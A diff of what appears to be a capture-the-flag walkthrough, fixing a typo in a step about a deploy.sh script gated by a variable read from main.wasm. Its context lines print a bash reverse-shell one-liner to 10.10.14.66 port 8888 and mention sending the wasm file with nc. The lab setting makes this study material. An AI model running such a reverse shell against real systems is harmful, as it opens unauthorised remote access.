@@ -125,7 +125,7 @@ I go to **/dev/shm** and created **deploy.sh** file.
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.66/8888 0>&1'
 ```
-The file will only execute the **deploy.sh** file if variavle f is 1. The variable f is taken from **main.wasm**, which is a web assembly file. I search around for how to work with a wasm file and found a tool (https://github.com/webassembly/wabt). The wasm file can be converted to web assembly text format which is more human readable.
+The file will only execute the **deploy.sh** file if variable f is equal to 1. The variable f is taken from **main.wasm**, which is a web assembly file. I search around for how to work with a wasm file and found a tool (https://github.com/webassembly/wabt). The wasm file can be converted to web assembly text format which is more human readable.
 
 So I send the **main.wasm** file to my box.
 ![](ncsendwasm.png)
